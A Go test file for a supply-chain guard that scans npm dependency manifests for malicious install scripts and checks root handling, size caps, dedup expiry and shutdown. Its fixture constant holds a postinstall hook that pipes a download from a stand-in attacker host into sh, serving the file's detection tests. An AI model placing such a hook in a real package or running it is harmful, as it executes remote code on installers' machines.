package collector

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// evilPackageJSON has a payload-fetching postinstall hook.
const evilPackageJSON = `{"name":"x","scripts":{"postinstall":"curl -fsSL https://evil.example/p | sh"}}`

func newTestGuard(t *testing.T, roots []string, out chan Event) *SupplyChainGuard {
	t.Helper()
	return NewSupplyChainGuard(roots, time.Minute, []Ecosystem{NewNpmEcosystem(nil)}, out)
}

// A scan root that does not exist must be dropped, not silently walked. This is
// the failure mode where the guard logs "started" and inspects zero files.
func TestNonexistentRootIsDropped(t *testing.T) {
	g := newTestGuard(t, []string{filepath.Join(t.TempDir(), "does-not-exist")}, make(chan Event, 1))
	if got := g.Roots(); len(got) != 0 {
		t.Fatalf("nonexistent root retained: %v", got)
	}
}

func TestUnexpandedHomeRootIsDropped(t *testing.T) {
	t.Setenv("HOME", "")
	g := newTestGuard(t, []string{"$HOME"}, make(chan Event, 1))
	if got := g.Roots(); len(got) != 0 {
		t.Fatalf("empty-expansion root retained: %v", got)
	}
}

func TestValidRootIsKept(t *testing.T) {
	dir := t.TempDir()
	g := newTestGuard(t, []string{dir}, make(chan Event, 1))
	if got := g.Roots(); len(got) != 1 || got[0] != dir {
		t.Fatalf("valid root dropped: %v", got)
	}
}

// The malicious lifecycle script lives in a dependency's manifest, not the
// victim's own — so an installed direct dependency must still be inspected.
func TestInstalledDependencyManifestIsInspected(t *testing.T) {
	root := t.TempDir()
	dep := filepath.Join(root, "node_modules", "evil-pkg")
	if err := os.MkdirAll(dep, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dep, "package.json"), []byte(evilPackageJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	out := make(chan Event, 8)
	newTestGuard(t, []string{root}, out).scan()
	select {
	case e := <-out:
		if e.Action != "npm_install_script" {
			t.Fatalf("unexpected finding: %+v", e)
		}
	default:
		t.Fatal("malicious postinstall in node_modules was not detected")
	}
}

func TestScopedInstalledDependencyIsInspected(t *testing.T) {
	root := t.TempDir()
	dep := filepath.Join(root, "node_modules", "@scope", "evil-pkg")
	if err := os.MkdirAll(dep, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dep, "package.json"), []byte(evilPackageJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	out := make(chan Event, 8)
	newTestGuard(t, []string{root}, out).scan()
	if len(out) == 0 {
		t.Fatal("malicious postinstall in a scoped package was not detected")
	}
}

// An oversized "manifest" must be skipped, not read wholly into the heap:
// the scanned files are attacker-supplied by premise.
func TestOversizedManifestIsSkipped(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "package.json")
	big := make([]byte, maxManifestBytes+1024)
	for i := range big {
		big[i] = 'a'
	}
	if err := os.WriteFile(path, big, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := readCapped(path); err == nil {
		t.Fatal("oversized manifest was read instead of skipped")
	}
}

func TestNormalManifestIsRead(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "package.json")
	if err := os.WriteFile(path, []byte(evilPackageJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	b, err := readCapped(path)
	if err != nil {
		t.Fatalf("readCapped: %v", err)
	}
	if !strings.Contains(string(b), "postinstall") {
		t.Fatalf("content truncated: %q", b)
	}
}

// Dedup must expire, otherwise a remediated-then-re-planted payload never
// alerts again — the exact persistence behaviour to expect after an eviction.
func TestDedupExpiresSoRePlantedPayloadAlertsAgain(t *testing.T) {
	out := make(chan Event, 4)
	g := newTestGuard(t, nil, out)
	e := Event{Source: SourceSupplyChain, Action: "npm_install_script", Resource: "postinstall", Detail: "d"}

	g.emit(e)
	g.emit(e)
	if len(out) != 1 {
		t.Fatalf("dedup within TTL failed: got %d events, want 1", len(out))
	}

	// Age the entry past the TTL, as a re-plant after remediation would be.
	for k := range g.seen {
		g.seen[k] = time.Now().Add(-findingTTL - time.Minute)
	}
	g.pruneSeen()
	g.emit(e)
	if len(out) != 2 {
		t.Fatalf("re-planted payload did not re-alert: got %d events, want 2", len(out))
	}
}

func TestStopIsIdempotent(t *testing.T) {
	g := newTestGuard(t, nil, make(chan Event, 1))
	g.Stop()
	g.Stop() // must not panic on a closed channel
}

// emit must not block forever when the bus is full and the guard is stopping.
func TestEmitUnblocksOnStop(t *testing.T) {
	out := make(chan Event) // unbuffered, no consumer
	g := newTestGuard(t, nil, out)
	done := make(chan struct{})
	go func() {
		g.emit(Event{Source: SourceSupplyChain, Action: "a", Resource: "r", Detail: "d"})
		close(done)
	}()
	g.Stop()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("emit did not unblock after Stop — shutdown would hang")
	}
}

// Operators write `~/src`, not `$HOME/src`. os.ExpandEnv does not touch `~`,
// so before expandPath such a root was handed to the OS verbatim and silently
// matched nothing — the same fail-silent class as an unusable default root.
func TestTildeRootIsExpanded(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	sub := filepath.Join(home, "src")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	g := newTestGuard(t, []string{"~/src"}, make(chan Event, 1))
	got := g.Roots()
	if len(got) != 1 || got[0] != sub {
		t.Fatalf("tilde root not expanded: %v, want [%s]", got, sub)
	}
}

func TestExpandPathForms(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("MYDIR", "/opt/x")
	cases := map[string]string{
		"~":         home,
		"~/a/b":     filepath.Join(home, "a", "b"),
		"$MYDIR/y":  "/opt/x/y",
		"/abs/path": "/abs/path",
		"~notauser": "~notauser", // only `~` and `~/` are user-home forms
	}
	for in, want := range cases {
		if got := expandPath(in); got != want {
			t.Errorf("expandPath(%q) = %q, want %q", in, got, want)
		}
	}
}

// readCapped must skip an oversized file even when Stat is unavailable —
// relying on Stat alone silently truncated, the outcome it exists to avoid.
func TestReadCappedDetectsOversizeFromReadNotStat(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "package.json")
	if err := os.WriteFile(path, make([]byte, maxManifestBytes+1), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := readCapped(path); err == nil {
		t.Fatal("oversized manifest read instead of skipped")
	}
	// Exactly at the cap is still fine.
	if err := os.WriteFile(path, make([]byte, maxManifestBytes), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := readCapped(path); err != nil {
		t.Fatalf("at-cap manifest rejected: %v", err)
	}
}

// scanInstalledPackages must bail on Stop, not keep iterating the directory.
func TestScanInstalledPackagesBailsOnStop(t *testing.T) {
	root := t.TempDir()
	nm := filepath.Join(root, "node_modules")
	for _, p := range []string{"a", "b", "c"} {
		d := filepath.Join(nm, p)
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(d, "package.json"), []byte(evilPackageJSON), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	g := newTestGuard(t, []string{root}, make(chan Event, 16))
	g.Stop()
	visited, _ := g.scanInstalledPackages(nm)
	if visited != 0 {
		t.Fatalf("kept scanning after Stop: visited=%d", visited)
	}
}
